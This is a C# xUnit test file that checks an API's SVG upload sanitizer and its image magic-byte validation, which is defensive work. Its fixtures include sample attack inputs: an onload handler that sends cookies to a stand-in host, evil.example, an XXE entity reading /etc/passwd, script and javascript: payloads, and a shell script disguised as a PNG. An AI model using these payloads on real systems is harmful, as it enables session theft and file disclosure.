using System.Text;
using ScoramAPI.Services;
using Xunit;

namespace ScoramAPI.Tests.Services
{
    // Tests SanitizeSvg/HasValidMagicBytes directly (both internal static, see
    // ScoramAPI.csproj's InternalsVisibleTo) rather than only through SaveImageAsync/
    // SaveImageFromStreamAsync -- this avoids needing a real/fake IAzureBlobService just to reach
    // the validation logic those two methods layer on top of.
    public class FileStorageServiceSvgSanitizationTests
    {
        private static string Sanitize(string svgXml) =>
            Encoding.UTF8.GetString(FileStorageService.SanitizeSvg(Encoding.UTF8.GetBytes(svgXml)));

        [Fact]
        public void CleanSvg_PassesThroughWithContentIntact()
        {
            var input = "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 10 10\"><circle cx=\"5\" cy=\"5\" r=\"4\" fill=\"red\" /></svg>";

            var result = Sanitize(input);

            Assert.Contains("<circle", result);
            Assert.Contains("fill=\"red\"", result);
        }

        [Fact]
        public void ScriptElement_IsRemoved()
        {
            var input = "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(document.cookie)</script><circle r=\"1\" /></svg>";

            var result = Sanitize(input);

            Assert.DoesNotContain("script", result, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("alert", result);
            Assert.Contains("<circle", result); // sibling content is untouched
        }

        [Fact]
        public void ForeignObjectElement_IsRemoved()
        {
            var input = "<svg xmlns=\"http://www.w3.org/2000/svg\"><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\">hi</body></foreignObject></svg>";

            var result = Sanitize(input);

            Assert.DoesNotContain("foreignObject", result);
        }

        [Fact]
        public void OnloadEventHandler_OnRootElement_IsStripped()
        {
            // The most dangerous single case: an onload on the root <svg> fires the moment the
            // document is opened, no interaction needed -- see SanitizeSvg's own comment.
            var input = "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"fetch('https://evil.example/steal?c='+document.cookie)\"><circle r=\"1\" /></svg>";

            var result = Sanitize(input);

            Assert.DoesNotContain("onload", result, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain("evil.example", result);
        }

        [Fact]
        public void OnclickEventHandler_OnChildElement_IsStripped()
        {
            var input = "<svg xmlns=\"http://www.w3.org/2000/svg\"><rect onclick=\"alert(1)\" width=\"1\" height=\"1\" /></svg>";

            var result = Sanitize(input);

            Assert.DoesNotContain("onclick", result, StringComparison.OrdinalIgnoreCase);
            Assert.Contains("<rect", result); // the element itself survives, just not the handler
        }

        [Fact]
        public void JavascriptUriInHref_IsStripped()
        {
            var input = "<svg xmlns=\"http://www.w3.org/2000/svg\"><a href=\"javascript:alert(1)\"><circle r=\"1\" /></a></svg>";

            var result = Sanitize(input);

            Assert.DoesNotContain("javascript:", result);
        }

        [Fact]
        public void InternalFragmentHref_IsPreserved()
        {
            // A #fragment reference (e.g. reusing a <defs> gradient) is a legitimate, common SVG
            // pattern -- only javascript: URIs should ever be stripped from href.
            var input = "<svg xmlns=\"http://www.w3.org/2000/svg\"><defs><linearGradient id=\"g\" /></defs><rect fill=\"url(#g)\" width=\"1\" height=\"1\" /></svg>";

            var result = Sanitize(input);

            Assert.Contains("id=\"g\"", result);
            Assert.Contains("url(#g)", result);
        }

        [Fact]
        public void Doctype_IsRejectedOutright()
        {
            // XXE/entity-expansion attempt -- DtdProcessing.Prohibit should throw before any of the
            // entity is ever resolved, not just fail to expand it. See SanitizeSvg's own comment.
            var input = "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>" +
                        "<svg xmlns=\"http://www.w3.org/2000/svg\"><title>&xxe;</title></svg>";

            Assert.Throws<ArgumentException>(() => FileStorageService.SanitizeSvg(Encoding.UTF8.GetBytes(input)));
        }

        [Fact]
        public void NonSvgRootElement_IsRejected()
        {
            var input = "<html><body>not an svg</body></html>";

            Assert.Throws<ArgumentException>(() => FileStorageService.SanitizeSvg(Encoding.UTF8.GetBytes(input)));
        }

        [Fact]
        public void MalformedXml_IsRejected()
        {
            var input = "<svg><circle r=\"1\"></svg>"; // mismatched tag

            Assert.Throws<ArgumentException>(() => FileStorageService.SanitizeSvg(Encoding.UTF8.GetBytes(input)));
        }
    }

    public class FileStorageServiceMagicBytesTests
    {
        private static readonly byte[] PngSignature = { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A };
        private static readonly byte[] JpegSignature = { 0xFF, 0xD8, 0xFF, 0x00, 0x00 };

        [Fact]
        public void ValidPngBytes_WithPngExtension_Passes()
        {
            Assert.True(FileStorageService.HasValidMagicBytes(".png", PngSignature));
        }

        [Fact]
        public void RenamedFile_ClaimingPngExtension_Fails()
        {
            // The exact spoofing scenario this exists to catch -- e.g. a script or executable renamed
            // to look like an image based on its extension alone.
            var notActuallyPng = Encoding.UTF8.GetBytes("#!/bin/sh\necho pwned\n");

            Assert.False(FileStorageService.HasValidMagicBytes(".png", notActuallyPng));
        }

        [Fact]
        public void ValidJpegBytes_WithJpegExtension_Passes()
        {
            Assert.True(FileStorageService.HasValidMagicBytes(".jpg", JpegSignature));
            Assert.True(FileStorageService.HasValidMagicBytes(".jpeg", JpegSignature));
        }

        [Fact]
        public void ValidWebpBytes_WithWebpExtension_Passes()
        {
            // RIFF....WEBP -- bytes 4-7 (the chunk size) deliberately don't matter, see
            // HasValidMagicBytes's own comment.
            var webp = new byte[] { (byte)'R', (byte)'I', (byte)'F', (byte)'F', 0x00, 0x00, 0x00, 0x00, (byte)'W', (byte)'E', (byte)'B', (byte)'P' };

            Assert.True(FileStorageService.HasValidMagicBytes(".webp", webp));
        }

        [Fact]
        public void TruncatedWebpBytes_Fails()
        {
            var tooShort = new byte[] { (byte)'R', (byte)'I', (byte)'F', (byte)'F' };

            Assert.False(FileStorageService.HasValidMagicBytes(".webp", tooShort));
        }

        [Fact]
        public void UnknownExtensionWithNoFixedSignature_PassesByDefault()
        {
            // Audio formats etc. have no single fixed signature checked here -- see
            // HasValidMagicBytes's own comment on why that's a deliberate, documented gap rather
            // than an oversight.
            Assert.True(FileStorageService.HasValidMagicBytes(".mp3", new byte[] { 1, 2, 3, 4 }));
        }
    }
}
